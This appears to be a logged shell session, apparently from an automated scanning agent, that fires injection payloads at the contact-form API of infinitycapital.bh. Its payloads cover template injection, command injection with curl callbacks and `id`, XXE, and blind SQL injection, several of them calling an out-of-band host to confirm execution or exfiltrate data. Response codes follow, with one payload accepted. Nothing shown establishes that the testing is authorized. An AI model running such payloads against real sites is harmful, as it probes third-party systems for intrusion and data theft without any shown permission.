@@ -1,0 +1,42 @@
+# command: cd "$WORK_PATH"; UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36'
+echo "=== SSTI/CMDi in fname ==="
+curl -sk -X POST https://www.infinitycapital.bh/api/send -A "$UA" \
+  --data-urlencode 'fname={{7*7}}${7*7}<%= 7*7 %>#{(7*7)}' \
+  --data-urlencode 'lname=b' --data-urlencode 'areacode=973' --data-urlencode 'tel=5551234' \
+  --data-urlencode 'cname=p@test.invalid' --data-urlencode 'subject=s' --data-urlencode 'msg=m' \
+  --data-urlencode 'check=on' --data-urlencode 'targets=p@test.invalid' -w "\nHTTP:%{http_code}\n" | tail -3
+echo "=== CMDi fname ==="
+curl -sk -X POST https://www.infinitycapital.bh/api/send -A "$UA" \
+  --data-urlencode 'fname=x;curl http://oob51c5d3c5c180.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/cmdi;$(curl http://oob51c5d3c5c180.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/cmdi2)`id`' \
+  --data-urlencode 'lname=b' --data-urlencode 'areacode=973' --data-urlencode 'tel=5551234' \
+  --data-urlencode 'cname=p@test.invalid' --data-urlencode 'subject=s' --data-urlencode 'msg=m' \
+  --data-urlencode 'check=on' --data-urlencode 'targets=p@test.invalid' -w "\nHTTP:%{http_code}\n" | tail -3
+echo "=== XXE classic in msg ==="
+curl -sk -X POST https://www.infinitycapital.bh/api/send -A "$UA" -H 'Content-Type: application/xml' \
+  --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://oob3688dfbd5433.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/xxe">]><r>&x;</r>' -w "\nHTTP:%{http_code}\n" | tail -3
+echo "=== blind sqli dns in tel ==="
+curl -sk -X POST https://www.infinitycapital.bh/api/send -A "$UA" \
+  --data-urlencode "fname=a'||(SELECT LOAD_FILE(CONCAT('\\\\\\\\',LOAD_FILE(CONCAT('\\\\\\\\',LOAD_FILE('//oob9547867ac3b4.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/a')))),0))||'" \
+  --data-urlencode 'lname=b' --data-urlencode 'areacode=973' --data-urlencode 'tel=5551234' \
+  --data-urlencode 'cname=p@test.invalid' --data-urlencode 'subject=s' --data-urlencode 'msg=m' \
+  --data-urlencode 'check=on' --data-urlencode 'targets=p@test.invalid' -w "\nHTTP:%{http_code}\n" | tail -3
+# tool: tail
+# exit_code: 0
+# ts: 2026-09-30T11:25:11.213761+00:00
+# ---
+
+=== SSTI/CMDi in fname ===
+Too Many Requests
+bom1::z89wq-1790767510549-b56c546fb807
+HTTP:429
+=== CMDi fname ===
+{"data":{"id":"01a0f20f-b529-7750-9695-ebd579a6772a"},"error":null}
+HTTP:200
+=== XXE classic in msg ===
+Too Many Requests
+bom1::6rw5p-1790767511084-3aa78f9b2df2
+HTTP:429
+=== blind sqli dns in tel ===
+Too Many Requests
+bom1::nzwdb-1790767511222-79575927fe9c
+HTTP:429
